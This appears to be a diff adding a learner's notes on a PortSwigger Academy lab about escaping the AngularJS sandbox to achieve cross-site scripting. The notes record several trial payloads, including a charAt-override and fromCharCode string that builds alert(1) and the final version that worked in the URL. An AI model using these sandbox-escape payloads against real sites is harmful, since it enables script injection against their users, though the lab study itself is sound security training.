@@ -1,0 +1,16 @@
+https://portswigger.net/web-security/cross-site-scripting/contexts/angularjs-sandbox
+Don't understand how angular really works so need to read some docs
+Trying to use
+ [123]|orderBy:'Some string' 
+ to see which characters are blocked
+ ' got escaped
+ portswigger cheat sheet had
+ toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
+ the charCodes mean x=alert(1)
+ the whole payload doesn't work as its limited to 120 characters
+ 'a'.constructor.prototype.charAt=[].join;[1]|orderBy:'x=1} } };alert(1)//';
+ didnt work either 
+ need to work with the above payload
+ add it to the url rather than injecting it into the search bar
+1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
+mistake I made was trying it on firefox instead worked on chrome
